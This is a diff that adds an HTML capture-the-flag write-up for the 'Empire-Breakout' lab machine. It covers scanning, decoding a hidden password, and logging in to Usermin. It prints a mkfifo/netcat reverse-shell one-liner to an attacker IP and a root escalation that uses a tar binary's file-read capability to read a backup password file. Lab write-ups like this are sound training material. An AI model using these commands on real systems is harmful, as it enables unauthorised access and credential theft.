@@ -10,12 +10,65 @@
             color: black;
             background-color: whitesmoke;
         }
+        img {
+            width: 50%;
+            height: 50%;
+        }
     </style>
 </head>
 
 <body>
-    <h1></h1>
-    <p></p>
-    <img src="" alt="">
-    <a href="">name</a>
+    <h1>Empire-Breakout</h1>
+    <p>Nmap scanning the IP gets us:</p>
+    <img src="img/1.png" alt="1">
+    <p>Checking out port 80 gets us the default Apache2 page</p>
+    <img src="img/2.png" alt="2">
+    <p>Checking on the other two scanned port 10000, and 20000, gets us similarly login pages for Webmin and Usermin.</p>
+    <img src="img/3.png" alt="3">
+    <img src="img/4.png" alt="4">
+    <p>Checking the HTML comments on the port 80 webpage we can see an encrypted message know as
+        <a href="https://en.wikipedia.org/wiki/Brainfuck">Brainfuck</a>.<br>
+    Using <a href="https://www.dcode.fr/en?__r=1.801c453f80a944744bc53f9bace1dc4e">dcode</a>
+        we can get the decrypted message, which can be used as a password.</p>
+    <p>Using enum4linux, we discover the username cyber and can log in to Usermin and it and the password.</p>
+    <p>Digging through the portal we find a Command Shell tab that just runs commands, we get the first flag.</p>
+    <img src="img/5.png" alt="5">
+    <p>Turn on netcat and running</p>
+    <p>/tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.163 1008 >/tmp/f.</p>
+    <p>We get a reverse shell into the system</p>
+    <p>Stablizing the Shell with</p>
+    <p>python3 -c ‘import pty;pty.spawn(“/bin/bash”)’</p>
+    <p>Ctrl + z</p>
+    <p>stty raw -echo;fg</p>
+    <p>export TERM=xterm</p>
+    <img src="img/6.png" alt="6">
+
+    <br>
+
+    <h2>Getting Root</h2>
+    <p>Seeing how there is the tar file in the home directory and it being owned by root,
+        I figured it got something with getting in.</p>
+    <p>Running the file command on tar we learn it's an executable called ELF.</p>
+    <img src="img/7.png" alt="7">
+    <p>We can run getcap -r / 2>/dev/null</p>
+    <img src="img/8.png" alt="8">
+    <p>Tar has cap_dac_read_search=ep with ep being effective and permitted.</p>
+    <p>This lets us bypass file read permission checks and directory read and execute permission checks.</p>
+    <p>Searching around, we find in the /var/backups folder there is a .old_pass.bak file but is owned by root.</p>
+    <img src="img/9.png" alt="9">
+    <p>With the tar file in home we can compress this file and then decompress to get around the perms.</p>
+    <p>./tar -cf pass.tar /var/backups/.old_pass.bak <br>
+        ./tar -xf pass.tar</p>
+    <p>This creates a new copy of the var directory with perms compatiable with us allow to cat the .bak file.</p>
+    <img src="img/10.png" alt="10">
+    <p>A password is in the file, which allows us to log in to the Webmin portal with username root.</p>
+    <p>Using the same Command Shell tab in Webmin, we can cat the root flag.</p>
+    <img src="img/11.png" alt="11">
+
+    <br>
+
+    <h2>New Learnings</h2>
+    <p><a href="https://medium.com/thg-tech-blog/using-capabilities-73dd2ae691d">Linux Capabilities</a></p>
 </body>
+
+</html>
